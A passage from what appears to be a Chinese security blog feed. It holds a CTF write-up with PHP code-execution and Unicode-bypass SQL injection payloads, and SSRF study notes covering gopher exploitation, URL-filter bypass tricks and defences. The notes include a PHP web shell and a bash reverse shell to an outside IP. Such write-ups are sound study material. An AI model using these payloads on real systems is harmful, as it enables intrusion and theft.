class="keyword">print</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  <span class="keyword">print</span> preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $func2);</span><br><span class="line">  <span class="keyword">print</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  <span class="keyword">print</span> preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $func3);</span><br><span class="line">  </span><br><span class="line">输出：</span><br><span class="line">;</span><br><span class="line">a(();</span><br><span class="line">a(b(c(parmer)));[Finished in <span class="number">0.1</span>s]</span><br></pre></td></tr></table></figure><p>就是说，匹配的函数具有这样的特点：</p><ol><li>函数可以嵌套，最多一个参数</li><li>最里面的函数没有参数</li></ol><p>容易找到一些payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;phpinfo();</span><br><span class="line">?cmd&#x3D;print(readdir(opendir(getcwd()))); 可以列目录</span><br><span class="line">?cmd&#x3D;print(readfile(readdir(opendir(getcwd())))); 读文件</span><br><span class="line">?cmd&#x3D;print(dirname(dirname(getcwd()))); print出&#x2F;var&#x2F;www</span><br></pre></td></tr></table></figure><p>有的师傅们用了<code>get_defined_vars()</code>获取http请求头。其实这个之前在打awd时上流量监控部分用到过，appache可以用<code>getallheaders()</code>来获取http头，但是nginx没有这个函数，可以用了get_defined_vars()，通过<code>current()、next()</code>进而选择可控参数,</p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;eval(next(current(get_defined_vars())));&amp;next&#x3D;var_dump(scandir(&#39;..&#x2F;&#39;));</span><br><span class="line">?code&#x3D;eval(next(current(get_defined_vars())));&amp;next&#x3D;var_dump(readfile(&#39;..&#x2F;flag_phpbyp4ss&#39;));</span><br></pre></td></tr></table></figure><p>看了大佬们的其他payload</p><ol><li><p>利用session_id函数，session可控。</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;51.158.75.42:8084&#x2F;?code&#x3D;eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line">PHPSESSID&#x3D;7072696e745f722866696c655f6765745f636f6e74656e747328222e2e2f666c61675f7068706279703473732229293b</span><br></pre></td></tr></table></figure></li><li><p>熟练运用文件操作函数和next指针函数0rz</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;print_r(scandir(dirname(chdir(dirname(getcwd()))))); </span><br><span class="line">code&#x3D;readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></li></ol><h1 id="easy-–-nodechr"><a href="#easy-–-nodechr" class="headerlink" title="easy – nodechr"></a>easy – nodechr</h1><p>数据库结构：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE &quot;main&quot;.&quot;users&quot; (</span></span><br><span class="line"><span class="string">    &quot;id&quot; INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">    &quot;username&quot; TEXT NOT NULL,</span></span><br><span class="line"><span class="string">    &quot;password&quot; TEXT,</span></span><br><span class="line"><span class="string">    CONSTRAINT &quot;unique_username&quot; UNIQUE (&quot;username&quot;)</span></span><br><span class="line"><span class="string">)`</span>)</span><br><span class="line"><span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE &quot;main&quot;.&quot;flags&quot; (</span></span><br><span class="line"><span class="string">    &quot;id&quot; INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">    &quot;flag&quot; TEXT NOT NULL</span></span><br><span class="line"><span class="string">)`</span>)</span><br></pre></td></tr></table></figure><p>关键代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &#x27;<span class="subst">$&#123;username.toUpperCase()&#125;</span>&#x27; AND &quot;password&quot; = &#x27;<span class="subst">$&#123;password.toUpperCase()&#125;</span>&#x27;`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先将用户名和密码通过safe过滤，因为会过滤<code>select</code>，没办法直接注入，但是注意到其SQL语句用到一个函数:</p><p><strong>toUpperCase()</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &#x27;<span class="subst">$&#123;username.toUpperCase()&#125;</span>&#x27; AND &quot;password&quot; = &#x27;<span class="subst">$&#123;password.toUpperCase()&#125;</span>&#x27;`</span>)</span><br></pre></td></tr></table></figure><p>这个函数在带头师傅的<a href="https://paper.tuisec.win/detail/a9ad1440249d95b">Unicode安全</a>与p牛的<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性</a>均有提及，可以通过unicode的一些其他字符经过<code>toUpperCase()</code>变成英文字符，如<code>S</code>，从而绕过过滤。</p><blockquote><p> 其中混入了两个奇特的字符”ı”、”ſ”。</p><p>​    这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p></blockquote><p>把用户名和密码置空，后面用union查询flag，设置的session就是flag。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;0&amp;password&#x3D;0&#39; unıon ſelect 1,flag,3 from flags where &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>还发现很多语句会导致服务器500错误，推测是云服务过了限制如<code>#</code></p><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://www.laruence.com/2010/06/08/1579.html">深悉正则(pcre)最大回溯/递归限制</a></li><li><a href="https://www.jianshu.com/p/33bc37ef72cc">花式列目录，花式读文件</a></li><li><a href="http://blog.51cto.com/lovexm/1743442">http://blog.51cto.com/lovexm/1743442</a></li><li><a href="http://hpdoger.me/2018/12/21/Code-Breaking-Puzzles%20WriteUp">http://hpdoger.me/2018/12/21/Code-Breaking-Puzzles%20WriteUp</a></li><li><a href="https://paper.tuisec.win/detail/a9ad1440249d95b">Unicode安全</a></li><li><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近既忙又懒，终于放了寒假，想起来看看p牛的&lt;a href=&quot;https://code-breaking.com/&quot;&gt;CodeBreakin</summary>
      
    
    
    
    <category term="CTF" scheme="v0w.top/categories/CTF/"/>
    
    
    <category term="代码审计" scheme="v0w.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="RCE" scheme="v0w.top/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>SSRF 学习笔记</title>
    <link href="v0w.top/2018/11/23/SSRF-notes/"/>
    <id>v0w.top/2018/11/23/SSRF-notes/</id>
    <published>2018-11-22T16:00:00.000Z</published>
    <updated>2020-07-18T10:45:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h1><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><p>常出现在一下场景中：</p><ol><li>分享：通过url地址分享网页内容</li><li>通过url地址加载或者下载图片</li><li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li><li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li><li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li><li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li><li>其他调用url或者类似出现==站内站==的情况，能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li></ol><p><strong>辨别SSRF</strong>：</p><ul><li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li><li>根据远程 URL 上传，静态资源图片等，这些会请求远程服务器的资源。</li><li>数据库的比如 mongodb 的 copyDatabase 函数。</li><li>邮件系统就是接收邮件服务器地址这些地方。</li><li>文件就找 ImageMagick，xml 这些。</li><li>从 URL 关键字中寻找，比如：source,share,link,src,imageurl,target 等。</li></ul><h2 id="常见后端实现"><a href="#常见后端实现" class="headerlink" title="常见后端实现"></a>常见后端实现</h2><h3 id="php后端实现"><a href="#php后端实现" class="headerlink" title="php后端实现"></a>php后端实现</h3><ol><li><p><code>file_get_contents</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#39;url&#39;])) &#123; </span><br><span class="line">    $content &#x3D; file_get_contents($_POST[&#39;url&#39;]); </span><br><span class="line">    $filename &#x3D;&#39;.&#x2F;images&#x2F;&#39;.rand().&#39;;img1.jpg&#39;; </span><br><span class="line">    file_put_contents($filename, $content); </span><br><span class="line">    echo $_POST[&#39;url&#39;]; </span><br><span class="line">    $img &#x3D; &quot;&lt;img src&#x3D;\&quot;&quot;.$filename.&quot;\&quot;&#x2F;&gt;&quot;; </span><br><span class="line">&#125;</span><br><span class="line">echo $img;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码使用 <code>file_get_contents</code> 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181122233458.png"></p></li><li><p><code>fsockopen()</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) &#123; </span><br><span class="line">    $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30); </span><br><span class="line">    if (!$fp) &#123; </span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">    &#125; else &#123; </span><br><span class="line">        $out &#x3D; &quot;GET $link HTTP&#x2F;1.1\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Host: $host\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;\r\n&quot;; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents&#x3D;&#39;&#39;; </span><br><span class="line">        while (!feof($fp)) &#123; </span><br><span class="line">            $contents.&#x3D; fgets($fp, 1024); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        return $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码使用 <code>fsockopen</code> 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。</p></li><li><p><code>curl_exec()</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#39;url&#39;])) &#123;</span><br><span class="line">    $link &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">    $curlobj &#x3D; curl_init();</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">    curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">    $result&#x3D;curl_exec($curlobj);</span><br><span class="line">    curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">    $filename &#x3D; &#39;.&#x2F;curled&#x2F;&#39;.rand().&#39;.txt&#39;;</span><br><span class="line">    file_put_contents($filename, $result); </span><br><span class="line">    echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用 <code>curl</code> 获取数据。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181122232408.png"></p></li></ol><h3 id="python后端实现"><a href="#python后端实现" class="headerlink" title="python后端实现"></a>python后端实现</h3><p>python通常使用<code>urllib</code>库</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1&#x27;</span></span><br><span class="line">info = urllib.urlopen(url)</span><br><span class="line">print(info.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h1><p>攻击者可以利用 SSRF 实现的攻击主要有 5 种：</p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>攻击运行在内网或本地的应用程序（比如溢出）</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli，redis等）</li><li>利用 <code>file</code> 协议读取本地文件等</li></ol><p>curl 支持很多协议，可以通过<code>curl -V</code>查看</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ curl -V</span><br><span class="line">curl 7.47.0 (x86_64-pc-linux-gnu) libcurl&#x2F;7.47.0 GnuTLS&#x2F;3.4.10 zlib&#x2F;1.2.8 libidn&#x2F;1.32 librtmp&#x2F;2.3   </span><br><span class="line"></span><br><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp   </span><br><span class="line"></span><br><span class="line">Features: AsynchDNS IDN IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz TLS-SRP UnixSockets </span><br></pre></td></tr></table></figure><p>其中<code>file</code>,<code>dict</code>,<code>gopher</code>协议常用。   </p><h2 id="1-利用-file-协议读取本地文件"><a href="#1-利用-file-协议读取本地文件" class="headerlink" title="1. 利用 file 协议读取本地文件"></a>1. 利用 file 协议读取本地文件</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181123180810.png"></p><p>类似的，可以读取配置文件和</p><h2 id="2-利用dict协议探测端口"><a href="#2-利用dict协议探测端口" class="headerlink" title="2. 利用dict协议探测端口"></a>2. 利用dict协议探测端口</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v &#39;dict:&#x2F;&#x2F;127.0.0.1:22&#39;</span><br><span class="line">curl -v &#39;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;info&#39;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2018-11-23_00003.png"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181123191510.png"></p><p>有返回的页面就说端口是开放的。</p><h2 id="3-利用gopher协议"><a href="#3-利用gopher协议" class="headerlink" title="3. 利用gopher协议"></a>3. 利用gopher协议</h2><blockquote><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p></blockquote><p>推荐一篇非常好的文章    <a href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher 协议拓展攻击面</a></p><h3 id="最简单的实例"><a href="#最简单的实例" class="headerlink" title="最简单的实例"></a>最简单的实例</h3><p>Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。<br>一个只能 127.0.0.1 访问的 exp.php，内容为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php system($_POST[e]);?&gt;  </span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;exp.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 49</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">e&#x3D;bash -i &gt;%26 &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;%261</span><br></pre></td></tr></table></figure><p>构造 Gopher 协议的 URL：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST &#x2F;exp.php HTTP&#x2F;1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl&#x2F;7.43.0%0d%0aAccept: *&#x2F;*%0d%0aContent-Length: 49%0d%0aContent-Type: application&#x2F;x-www-form-urlencoded%0d%0a%0d%0ae&#x3D;bash -i &gt;%2526 &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;%25261null</span><br></pre></td></tr></table></figure><p>湖湘杯2018的一道SSRF考察的就是这一点，下面是读文件拿到的源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;ssrf me with parameter &#x27;url&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="comment">//echo $_GET[&#x27;url&#x27;];</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">echo</span> curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">&#x27;user&#x27;</span>]==<span class="string">&quot;admin&quot;</span> &amp;&amp; $ip==<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    system(<span class="string">&quot;/var/www/html/ssrf/readflag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>之后利用gopher协议可以绕过ip的检测，从而执行程序，获取flag。</p><p>题目详解和exp，可参考<a href="http://v0w.top/2018/11/18/hxb2018-WP/">我的博客——湖湘杯WP</a></p><h3 id="稍复杂一点的情况"><a href="#稍复杂一点的情况" class="headerlink" title="稍复杂一点的情况"></a>稍复杂一点的情况</h3><p>利用gopher攻击内网中的一些有漏洞的应用等，如长亭文章中所说，利用gopher协议攻击redis应用。主要攻击 redis、discuz、fastcgi、memcache、内网脆弱应用这几类应用<br>// TODO</p><h1 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h1><ol><li>限制协议为 HTTP、HTTPS，需求不需要，就不要开类似gopher，file，ftp协议</li><li>禁止 30x 跳转</li><li>设置 URL 白名单或者限制内网 IP</li><li>服务端需要鉴权（Cookies &amp; User：Pass）不能完美利用</li></ol><h1 id="Some-Tricks-in-SSRF"><a href="#Some-Tricks-in-SSRF" class="headerlink" title="Some Tricks in SSRF"></a>Some Tricks in SSRF</h1><h2 id="1-简单过滤的绕过"><a href="#1-简单过滤的绕过" class="headerlink" title="1. 简单过滤的绕过"></a>1. 简单过滤的绕过</h2><p><a href="http://127.0.0.1/">http://127.0.0.1/</a> 等内网地址被过滤的时候，可以尝试一下几种方式：</p><ol><li><p>@或#  </p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;abc@127.0.0.1</span><br><span class="line">127.0.0.1#http:&#x2F;&#x2F;abc</span><br></pre></td></tr></table></figure></li><li><p>Som添加端口号</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080</span><br></pre></td></tr></table></figure></li><li><p>短地址</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dwz.cn&#x2F;11SMa</span><br></pre></td></tr></table></figure></li><li><p>可以指向任意 ip 的域名：xip.io</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.0.0.1.xip.io 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line">mysite.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line">foo.bar.10.0.0.1.xip.io 10.0.0.1</span><br></pre></td></tr></table></figure></li><li><p>ip 地址转换成进制来访问</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &#x3D; 0x7f000001 &#x3D; 0x7f.0x00.0x00.0x01</span><br></pre></td></tr></table></figure></li><li><p>利用dns将域名解析为内网ip。</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.th1s.cn-&gt;10.1.1.1</span><br></pre></td></tr></table></figure></li><li><p>利用301或者302跳转</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.th1s.cn&#x2F;test&#x2F;ssrf.php</span><br><span class="line">ssrf.php里面的内容为：</span><br><span class="line">&lt;?php header(&#39;Location:10.1.1.1&#39;);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>句号绕过 127。0。0。1</p></li><li><p>Enclosed alphanumerics绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-parse-url与libcurl对curl的解析差异"><a href="#2-parse-url与libcurl对curl的解析差异" class="headerlink" title="2. parse_url与libcurl对curl的解析差异"></a>2. parse_url与libcurl对curl的解析差异</h2><p><strong>hgame2019 week2 php-trick</strong>的部分代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = @$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">&quot;www.baidu.com&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 9 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">&quot;http&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 10 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 11 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题就是考察就是<a href="">利用parse_url与libcurl对curl的解析差异的trick</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">完整url: scheme:[&#x2F;&#x2F;[user[:password]@]host[:port]][&#x2F;path][?query][#fragment]</span><br><span class="line">这里仅讨论url中不含&#39;?&#39;的情况</span><br><span class="line"></span><br><span class="line">php parse_url：</span><br><span class="line">host: 匹配最后一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">libcurl：</span><br><span class="line">host：匹配第一个@后面符合格式的host</span><br></pre></td></tr></table></figure><p>如：<code>http://u:p@a.com:80@b.com/</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php  parse_url解析结果：</span><br><span class="line">    schema: http </span><br><span class="line">    user: u</span><br><span class="line">    pass: p@a.com:80</span><br><span class="line">    host: b.com</span><br><span class="line">    </span><br><span class="line">libcurl解析结果：</span><br><span class="line">    schema: http</span><br><span class="line">    host: a.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p</span><br><span class="line">    port: 80</span><br><span class="line">    后面的@b.com&#x2F;会被忽略掉</span><br></pre></td></tr></table></figure><p>所以上面的例题就可以通过这种方式绕过：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; $a = parse_url(<span class="string">&#x27;http://u:p@127.0.0.1:80@www.baidu.com/flag.php&#x27;</span>); var_dump($a);</span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  